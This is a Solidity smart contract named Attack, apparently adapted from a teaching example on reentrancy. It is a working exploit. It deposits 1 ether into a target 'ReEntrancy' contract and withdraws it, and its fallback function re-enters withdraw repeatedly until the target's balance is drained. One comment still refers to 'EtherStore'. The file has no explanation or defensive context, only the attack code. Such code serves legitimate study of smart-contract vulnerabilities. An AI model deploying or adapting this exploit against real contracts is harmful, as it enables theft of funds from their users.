import "/ReEntrancy.sol";

contract Attack {
    ReEntrancy public victim;

    constructor(address _ReEntrancyAddress) {
        victim = ReEntrancy(_ReEntrancyAddress);
    }

    // Fallback is called when EtherStore sends Ether to this contract.
    fallback() external payable {
        if (address(victim).balance >= 1 ether) {
            victim.withdraw();
        }
    }

    function attack() external payable {
        require(msg.value >= 1 ether);
        victim.deposit{value: 1 ether}();
        victim.withdraw();
    }

    // Helper function to check the balance of this contract
    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
}
